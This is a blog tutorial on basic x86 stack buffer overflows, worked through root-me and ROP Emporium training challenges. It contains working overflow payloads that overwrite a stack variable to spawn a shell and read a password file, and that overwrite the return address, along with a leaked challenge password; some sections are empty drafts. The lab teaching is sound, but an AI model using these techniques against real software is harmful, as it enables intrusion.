---
layout: post
title:  "Basic Buffer Overflow's - Chapter 1"
date:   2017-12-26 01:00:00 +0100
categories: [bof]
description: v0.1
image:
  feature: shellcode.jpg
  credit:
  creditlink:
---
Introduction
------------
Buffer overflow's are almost the bread and butter of the exploit world.  They're can range from simple to incomprehensible, offer a wide variety of exploitation techniques and are just kinda fun.  Whilst modern OS's have started to introduce memory protections, there are always ways around these, and it's still up to the application developers to protect their applications. Have a quick search on [exploit-db](https://www.exploit-db.com) for recent buffer overflow exploits, and you'll get a fair few turn up.

The goal of this series, is to go over the most basic of buffer overflow's in an approachable manner, not shying too far from the lower level details.  Hopefully, I can help someone learn something from this.  If you have suggestions for me to improve my approach, don't hesitate to drop me a message or leave a comment, and equally if you have any questions.

The definitive resource for basic buffer overflow is [http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf](Smashing the stack for fun and profit) by Aleph One, so give that a read before proceeding.

Example 1 - Stack buffer overflow basic 1
-----------------------------------------
So lets jump right in and smash the stack.  I'll be using the example from [root-me](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-1) to illustrate basic stack corruption.  Since this is a fairly trivial example and introductory, I hope they won't feel any issue with me posting a solution publicly.
```c
#include <stdlib.h>
#include <stdio.h>

/*
gcc -m32 -o ch13 ch13.c -fno-stack-protector
*/


int main()
{

  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf,45,stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     system("/bin/dash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```
The actual exploitation of this is fairly trivial.  The fgets function allows us to write 45 bytes of memory into a buffer of size 40.  We won't get any fancy EIP overwrites, but it does allow us to corrupt memory and potentially some of the variables.

Firstly, lets open this in gdb and run a disassembly of the main function.  There are better tools for doing this such as [radare2](https://github.com/radare/radare2), but we'll keep it simple for now.
```gdb
gdb$ disas main
Dump of assembler code for function main:
   0x08048494 <+0>:	push   ebp
   0x08048495 <+1>:	mov    ebp,esp
   0x08048497 <+3>:	and    esp,0xfffffff0
   0x0804849a <+6>:	sub    esp,0x40
   0x0804849d <+9>:	mov    DWORD PTR [esp+0x3c],0x4030201
   0x080484a5 <+17>:	mov    eax,ds:0x804a020
   0x080484aa <+22>:	mov    DWORD PTR [esp+0x8],eax
   0x080484ae <+26>:	mov    DWORD PTR [esp+0x4],0x2d
   0x080484b6 <+34>:	lea    eax,[esp+0x14]
   0x080484ba <+38>:	mov    DWORD PTR [esp],eax
   0x080484bd <+41>:	call   0x8048390 <fgets@plt>
   0x080484c2 <+46>:	mov    eax,0x8048620
   0x080484c7 <+51>:	lea    edx,[esp+0x14]
   0x080484cb <+55>:	mov    DWORD PTR [esp+0x4],edx
   0x080484cf <+59>:	mov    DWORD PTR [esp],eax
   0x080484d2 <+62>:	call   0x8048380 <printf@plt>
   0x080484d7 <+67>:	mov    eax,0x804862c
   0x080484dc <+72>:	mov    edx,DWORD PTR [esp+0x3c]
   0x080484e0 <+76>:	mov    DWORD PTR [esp+0x4],edx
   0x080484e4 <+80>:	mov    DWORD PTR [esp],eax
   0x080484e7 <+83>:	call   0x8048380 <printf@plt>
   0x080484ec <+88>:	cmp    DWORD PTR [esp+0x3c],0x4030201
   0x080484f4 <+96>:	je     0x804850c <main+120>
   0x080484f6 <+98>:	cmp    DWORD PTR [esp+0x3c],0xdeadbeef
   0x080484fe <+106>:	je     0x804850c <main+120>
   0x08048500 <+108>:	mov    DWORD PTR [esp],0x8048638
   0x08048507 <+115>:	call   0x80483a0 <puts@plt>
   0x0804850c <+120>:	cmp    DWORD PTR [esp+0x3c],0xdeadbeef
   0x08048514 <+128>:	jne    0x804853a <main+166>
   0x08048516 <+130>:	mov    DWORD PTR [esp],0x8048654
   0x0804851d <+137>:	call   0x80483a0 <puts@plt>
   0x08048522 <+142>:	mov    DWORD PTR [esp],0x804867e
   0x08048529 <+149>:	call   0x80483b0 <system@plt>
   0x0804852e <+154>:	mov    DWORD PTR [esp],0x8048688
   0x08048535 <+161>:	call   0x80483a0 <puts@plt>
   0x0804853a <+166>:	mov    eax,0x0
   0x0804853f <+171>:	leave
   0x08048540 <+172>:	ret
End of assembler dump.
```

So lets break this down and look at the parts where the buffer, and variables are placed onto the stack
```
   0x0804849d <+9>:	mov    DWORD PTR [esp+0x3c],0x4030201
```

Here our `check` variable is placed onto the stack at `esp+60`.  I will just convert arbitrarily between decimal and hexadecimal depending on the convenience.

```gdb
   0x080484a5 <+17>:	mov    eax,ds:0x804a020
   0x080484aa <+22>:	mov    DWORD PTR [esp+0x8],eax
   0x080484ae <+26>:	mov    DWORD PTR [esp+0x4],0x2d
   0x080484b6 <+34>:	lea    eax,[esp+0x14]
   0x080484ba <+38>:	mov    DWORD PTR [esp],eax
   0x080484bd <+41>:	call   0x8048390 <fgets@plt>
```
Here, three variables are placed onto the stack.  These will be the arguments being sent to the fgets function.  In 32-bit system's a function call takes it's arguments off the top of the stack. In this case I'll try and convert what's happening in the assembly into english step-by-step.

```gdb
mov    eax,ds:0x804a020 ; Place the value 0x804a020 into the eax register
mov    DWORD PTR [esp+0x8],eax  ; Take the value in the eax register, 0x804a020 , and place it at the memory location esp+0x8.
mov    DWORD PTR [esp+0x4],0x2d ; Take the value 0x2d, and place it at the memory location esp+0x4
lea    eax,[esp+0x14] ; Calculate the result of esp+0x14 and place it in the eax register
mov    DWORD PTR [esp],eax ; Take this result of esp+0x14 and place it at the location in memory denoted by esp.
```

So in effect we've placed at memory locations, esp, esp+0x4 and esp+0x8, three different values:
```
 -------------------
|     esp + 0x8     | <---- 0x804a020
 -------------------
|     esp + 0x4     | <---- 0x2d
 -------------------
|        esp        | <---- esp+0x14
 -------------------
```

Right after these operations take place, the `fgets` function is called.  These three values we've just placed on the stack as above are the arguments to the function `fgets` as in the C code.  This is in line with 32 bit calling conventions, arguments are placed upon the stack.  If you try some 64-bit exploitation examples, they'll actually be popped into registers (up to a point), so remember that if you find yourself unwittingly in 64-bit land.
```c
fgets(buf,45,stdin);
```

So `0x804a020` is the location of the stdin handle, `0x2d` is just 45 and `esp+0x14` will be where our buffer is located on the stack.

We've established earlier that our check variable is located at `esp+60` and since our buffer is at `esp+20`, if we place 44 bytes into fgets, the first 40 will fill the buffer, whilst the next 4 will overwrite the check variable.  Lets test this out quickly.  We'll use the following code to generate a file:
```bash
python -c 'print "A"*44'`> /tmp/overflow
```

We then pipe this through gdb into our program and we get:
```gdb
gdb$ run < /tmp/overflow
Starting program: /challenge/app-systeme/ch13/ch13 < /tmp/overflow

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[check] 0x41414141

You are on the right way!
[Inferior 1 (process 27133) exited normally]
--------------------------------------------------------------------------[regs]
  EAX:Error while running hook_stop:
No registers.
gdb$
```

So, we overwrote the check variable with our buffer, as 0x41 is the hex code for ascii 'A' so 0x41414141 is equivalent to `AAAA`.   To get our shell spawned, we need to overwrite our variable with `0xdeadbeef`, so we just write a file containing `A*40` followed by the bytes for 0xdeadbeef.  Code of the following form achieves this:

```python
import struct;  print "A"*40 + struct.pack("<L", 0xdeadbeef)
```
We run this and pipe it into our binary, and while we get a shell it isn't returned to us as interactive. (There was ways around this). 
```bash
app-systeme-ch13@challenge02:~$ python -c 'import struct;  print "A"*40 + struct.pack("<L", 0xdeadbeef);' | ./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ 
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
Shell closed! Bye.
```
We'll just pipe in another command to cat the .passwd file and we're returned with our password which is read by the dash command.

```bash
app-systeme-ch13@challenge02:~$ (python -c 'import struct;  print "A"*40 + struct.pack("<L", 0xdeadbeef)';echo cat .passwd) | ./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ 
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
1w4ntm0r3pr0np1s
Shell closed! Bye.
```

So to summarise, via an overflow, and an understanding of the stack, we've effectively corrupted and overwritten a stack variable via an overflow.

The stack
-----------------------
So what exactly is the stack?  Well, it's really just a section of memory that we define as being used to store several important variables and locals with fixed size.  If we're allocating dynamic memory (i.e. memory without knowing it's size at compile time) we'd be using the heap, but for now lets stay focussed.

We define where the top of the stack is located in memory at any specific time with the `$esp` register.  It defines the location of the top of the stack, and is manipulated with individual `push` and `pop` instructions, which as their names might indicate, either add or remove from the stack.  If we push to the stack, the value of `$esp` is decremented, and vice versa for popping from it.  

On the other end we have the frame pointer, `$ebp`, which defines where the function parameters and local variables reside.  It was included so that these variables had a fixed offset they could be referred to from.  As `$esp` moves, it cannot be used in such a way, whereas `$ebp` in a given stack frame is generally stationary.  [This resource](https://practicalmalwareanalysis.com/2012/04/03/all-about-ebp/) provides a good overview of the `$ebp` register.

The third register we will refer to is `$eip`.  In simple terms it just stores the location of the next instruction that is to be executed.  If you want a more solid foundation of each of these registers, then [skullsecurity's article](https://wiki.skullsecurity.org/index.php?title=Registers) is quite a good one.

At `$ebp+4` the return address of the stack frame is stored.  What is this and why is it important?

When a stack frame is left, such as in a function exit, generally the `leave` instruction is called.  This clears up the stack frame by moving the stack pointer to the frame pointer, in effect popping the stack up the frame pointer.  

```asm
mov esp, ebp
pop ebp
```

The saved address of the last frame pointer is then popped off the stack.  This because the frame pointer also stores details on the area of memory that called it, including the last frame pointer at `$ebp` and the next instruction to be executed at `$ebp+4`.  This is important as the next instruction to be called is a `ret`, which will pop the return address off the stack and jmp to that value.  This isn't how it actually works but this will illustrate it hopefully.

```asm
pop ebx
jmp ebx
```

Hopefully, now we can see how we can hijack command of a program's execution rather than just overwriting variables, with this technique.  If we can overwrite enough past our buffer, we can overwrite the saved return address.  Once a `ret` is called, the address we've overwritten will be jumped to.  So how do we use this?

Example 2 - ret2win
---------
We'll be using the first binary challenge on [ropemporium](https://ropemporium.com/challenge/ret2win.html), called ret2win for this.  For this we're going to be hijacking execution of the program.

When an unreachable address is jumped to for execution, the program will exit in a segmentation fault.  If we want to execute an arbitrary command, all we have to do is force a segmentation fault to prove that we've overwritten the saved return address.  So lets load up the binary and do that.

Note: Still a WIP

```bash
```

Boom!  We got a segmentation fault, but it doesn't give us much of a clue how many bytes we'll need to overwrite.  We can either modify the amount we overwrite byte by byte, or use a cyclic sequence to read off the location of EIP.  Metasploit has it's `pattern_create.rb` and [PEDA](https://github.com/longld/peda) has it's own `pattern create`.

We'll create a buffer of length 200, and see the value that `$eip` segfaults on.

```gdb
```

Since the program segfaults at 0x41414641, we use `pattern offset 0x41414641` in PEDA.

So we know from the description that we want to return into the ret2win function.  We'll have a quick look at the disassembly of this function to see what it's doing.  I'm using radare2 for this:

```gdb
;-- ret2win:
0x08048659      55             push ebp
0x0804865a      89e5           mov ebp, esp
0x0804865c      83ec08         sub esp, 8
0x0804865f      83ec0c         sub esp, 0xc
0x08048662      6824880408     push str.Thank_you__Here_s_your_flag: ; 0x8048824 ; "Thank you! Here's your flag:"
0x08048667      e894fdffff     call sym.imp.printf
0x0804866c      83c410         add esp, 0x10
0x0804866f      83ec0c         sub esp, 0xc
0x08048672      6841880408     push str.bin_cat_flag.txt   ; 0x8048841 ; "/bin/cat flag.txt"
0x08048677      e8b4fdffff     call sym.imp.system
0x0804867c      83c410         add esp, 0x10
0x0804867f      90             nop
0x08048680      c9             leave
0x08048681      c3             ret
```

It prints out the value of the flag we want.  Obviously, this is a controlled example but it does show how we can redirect into an alternative function.

By looking at the disassembly, we already know what location we want to return to (It's the location in memory we've disassembled, so 0x08048659), so now we just need to construct our payload, and send it into the program.  In this case we just overwrite EIP with the location of that function.

```bash
root@kali:~/Desktop# python -c 'print "A"*44 + "\x59\x86\x04\x08"'|./ret2win32
For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer; 
What could possibly go wrong? 
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets! 
> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!} 
Segmentation fault 
```

So with this we've succesfully redirected execution into a function of our choice.

Epilogue
--------
We've gone from overwriting basic stack variables to controlling complete execution of the function.  Obviously the function had to be included within the binary, but it shows the basics of a stack overflow.  

Next I'll be showing you how to use this technique to execute your own custom code, and how to bypass the very basic memory protections.  Have fun exploiting, and if you have any questions, do drop me a message.  For now I've included all references and other literature that might be of interest.  

Happy Hacking!

References
----------
[PEDA](https://github.com/longld/peda)
[Ropemporium](https://ropemporium.com/challenge/ret2win.html)
[SkullSecurity - Registers](https://wiki.skullsecurity.org/index.php?title=Registers)
[EBP Register](https://practicalmalwareanalysis.com/2012/04/03/all-about-ebp/)
[Stack Smashing for Fun and Profit](http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf)

Other Literature
---------------
[64 Bit Linux Stack Smashing](https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/)
[Sploitfun Tutorials](https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/)
